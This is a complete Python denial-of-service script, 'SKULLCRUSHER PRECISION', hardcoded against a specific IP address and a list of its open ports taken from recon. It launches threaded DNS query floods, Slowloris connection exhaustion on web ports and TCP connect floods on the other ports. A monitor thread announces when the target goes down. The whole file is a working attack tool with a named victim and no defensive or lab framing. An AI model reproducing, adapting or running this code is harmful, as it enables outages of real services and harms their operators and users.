#!/usr/bin/env python3
"""
SKULLCRUSHER PRECISION – Hardcoded for target 162.0.215.160
Attacks only the ports discovered during recon:
21, 26, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2095
"""

import socket
import random
import time
import threading
import requests

# ========== CONFIGURATION ==========
TARGET_IP = "162.0.215.160"
TARGET_URL = f"http://{TARGET_IP}"
OPEN_PORTS = [21, 26, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2095]

# Attack parameters (tweak for iSH performance)
DNS_DELAY = 0.02           # seconds between DNS packets
TCP_DELAY = 0.02           # seconds between TCP connections
SLOWLORIS_SOCKETS = 100    # connections per Slowloris thread
KEEPALIVE_INTERVAL = 15    # seconds between keepalive headers

RUNNING = True
SERVER_UP = True
# ===================================

# ========== PIRATE SKULL BANNER ==========
BANNER = r'''
          .-.
        .'   `.
       :  _   :
       : |_|  :
       :      :
        `.___.'
         :   :
         :___:
         :   :
         :___:
         :   :
         :___:
         :   :
        /     \
       /       \
      /         \
     /___________\
      \_________/
       /       \
      /         \
     /           \
    /_____________\
          | |
          | |
          | |
         /   \
        /     \
       /       \
      /         \
     /___________\
'''
print(BANNER)
print(f"[!] SKULLCRUSHER PRECISION – Target: {TARGET_IP}")
print(f"[!] Open ports: {OPEN_PORTS}")
print("[!] Press Ctrl+C to stop the assault\n")

# ========== DOWNTIME DETECTOR ==========
def is_server_up():
    try:
        r = requests.get(TARGET_URL, timeout=3)
        return r.status_code == 200
    except:
        return False

def server_monitor():
    global SERVER_UP
    while RUNNING:
        if is_server_up():
            if not SERVER_UP:
                SERVER_UP = True
                print("\n[💀][STATUS] Target BACK ONLINE. Resuming...\n")
        else:
            if SERVER_UP:
                SERVER_UP = False
                print("\n[💀][STATUS] TARGET IS DOWN! Server crashed!\n")
        time.sleep(5)

# ========== DNS FLOOD (Port 53) ==========
def build_dns_query(domain):
    tid = random.randint(0, 65535).to_bytes(2, 'big')
    header = tid + (0x0100).to_bytes(2, 'big')
    header += (1).to_bytes(2, 'big') + (0).to_bytes(2, 'big') * 3
    qname = b''
    for part in domain.split('.'):
        part_bytes = part.encode()
        qname += len(part_bytes).to_bytes(1, 'big') + part_bytes
    qname += b'\x00'
    return header + qname + (1).to_bytes(2, 'big') + (1).to_bytes(2, 'big')

def dns_flood():
    if 53 not in OPEN_PORTS:
        return
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    count = 0
    while RUNNING:
        domain = f"r{random.randint(1, 999999)}.com"
        query = build_dns_query(domain)
        try:
            sock.sendto(query, (TARGET_IP, 53))
            count += 1
            if count % 100 == 0:
                print(f"[DNS] {count} queries sent")
        except:
            pass
        time.sleep(DNS_DELAY)
    sock.close()

# ========== SLOWLORIS (Web ports: 80, 443, etc.) ==========
def slowloris(port):
    if port not in OPEN_PORTS:
        return
    sockets = []
    for _ in range(SLOWLORIS_SOCKETS):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET_IP, port))
            s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {TARGET_IP}\r\n".encode())
            sockets.append(s)
        except:
            pass
    print(f"[Slowloris] {len(sockets)} sockets on port {port}")
    while RUNNING:
        for s in sockets[:]:
            try:
                s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
            except:
                sockets.remove(s)
                try:
                    ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ns.settimeout(4)
                    ns.connect((TARGET_IP, port))
                    ns.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {TARGET_IP}\r\n".encode())
                    sockets.append(ns)
                except:
                    pass
        time.sleep(KEEPALIVE_INTERVAL)

# ========== TCP CONNECT FLOOD (All other ports) ==========
def tcp_flood(port):
    if port not in OPEN_PORTS:
        return
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_IP, port))
            s.close()
        except:
            pass
        time.sleep(TCP_DELAY)

# ========== MAIN ==========
def main():
    global RUNNING
    threads = []

    # Downtime monitor
    t_mon = threading.Thread(target=server_monitor)
    t_mon.start()
    threads.append(t_mon)

    # DNS flood on port 53
    if 53 in OPEN_PORTS:
        t_dns = threading.Thread(target=dns_flood)
        t_dns.start()
        threads.append(t_dns)
        print("[+] DNS flood engine started (port 53)")

    # Slowloris on web ports
    web_ports = [80, 443, 8080, 8443]  # Only those that are actually open
    for p in web_ports:
        if p in OPEN_PORTS:
            t_sl = threading.Thread(target=slowloris, args=(p,))
            t_sl.start()
            threads.append(t_sl)
            print(f"[+] Slowloris engine started on port {p}")

    # TCP flood on all other open ports (except 53 which is UDP)
    for p in OPEN_PORTS:
        if p not in web_ports and p != 53:
            t_tcp = threading.Thread(target=tcp_flood, args=(p,))
            t_tcp.start()
            threads.append(t_tcp)
            print(f"[+] TCP flood engine started on port {p}")

    print("\n[💀] ALL ENGINES RUNNING. Monitoring for downtime.\n")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        RUNNING = False
        print("\n[!] Halting all engines...")
        for t in threads:
            t.join(timeout=2)
        print("[💀] SKULLCRUSHER stands down. Glory to the pirates.")

if __name__ == "__main__":
    main()
